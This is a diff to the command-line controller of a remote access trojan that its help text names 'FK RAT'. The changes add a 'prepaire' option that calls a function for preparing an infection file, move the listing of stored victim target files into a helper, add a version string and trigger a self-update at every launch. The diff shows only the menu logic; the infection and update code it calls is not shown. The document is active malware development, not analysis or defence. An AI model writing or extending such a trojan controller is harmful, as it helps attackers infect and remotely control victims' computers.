@@ -29,7 +29,6 @@ help_menu = """
         Arguments:
             new     Adds a new target to the RAT
             load    Loads a target file
-            update  Update FK RAT on your Computer
             remove  Remove FK RAT on your Computer
 
         Example:
@@ -70,23 +69,13 @@ def cli():
         opt.update()
     if argument == "uninstall" or argument == "remove":
         opt.remove()
-
     if argument == "new":
         opt.new_file()
-    if argument == "load" or argument == "new":
+    if argument == "prepaire":
+        opt.prepairInfectionFile()
+    if argument == "load":
         print(target_menu)
-        targets = []
-        i = 0
-        for file in os.listdir(f"{local_path}/targets"):
-            if file.split('.')[1] == "fk":
-                print(f"            [{i}]     {file.split('.')[0]}")
-                targets += [file]
-                i += 1
-        if len(os.listdir(f"{local_path}/targets")) == 0:
-            print(f"            [-]     No targets found")
-            print(help_menu)
-            exit(0)
-
+        targets = opt.getTargets(help_menu)
         option = input(header + " $ ")
         try:
             int(option)
@@ -122,7 +111,9 @@ def cli():
 def main():
     cli()
 
-
+def ver():
+    return "v0.1"
 # run main code
 if __name__ == "__main__":
+    opt.update()
     main()
